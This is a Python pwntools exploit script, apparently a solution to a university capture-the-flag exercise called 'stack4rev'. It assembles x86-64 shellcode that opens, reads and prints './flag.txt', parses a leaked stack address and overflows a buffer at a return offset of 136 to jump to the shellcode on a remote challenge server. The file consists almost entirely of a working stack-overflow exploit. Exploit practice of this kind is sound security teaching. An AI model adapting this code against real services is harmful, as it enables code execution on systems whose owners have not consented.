from pwn import *

MSG_SIZE = 256
RET_OFFSET = 136

bpath = './stack4rev'
elf = ELF(bpath)
aarch = 'amd64'

context.binary = elf
context.log_level = 'debug'


shellcode2 = asm('''
        push 0x1010101 ^ 0x7478
        xor dword ptr [rsp], 0x1010101
        mov rax, 0x742e67616c662f2e
        push rax
        mov rdi, rsp
        xor edx, edx
        xor esi, esi
        push 2
        pop rax
        syscall

        mov rdi, rax
        xor eax, eax
        xor edx, edx
        mov dl, 0xff
        mov rsi, rsp
        syscall
        
        push 1
        pop rdi
        xor edx, edx
        mov rdx, rax
        mov rsi, rsp
        push 1
        pop rax
        syscall
        ''')


p = remote('cs4401shell2.walls.ninja', 20848)
#p = gdb.debug(bpath, gdbscript='''
#        break *main
#        shell tmux select-layout main-vertical
#        shell tmux swap-pane -U
#        continue
#        ''')

msg = p.recvuntil('\n')
while b"Your input" not in msg:
    msg = p.recvline()
    
msg = msg[-13:-1]
msg_addr = pack(int(msg, 16))

exploit_str = flat({0: shellcode2, RET_OFFSET: msg_addr}, filler=msg_addr)

p.sendline(exploit_str)
p.interactive()
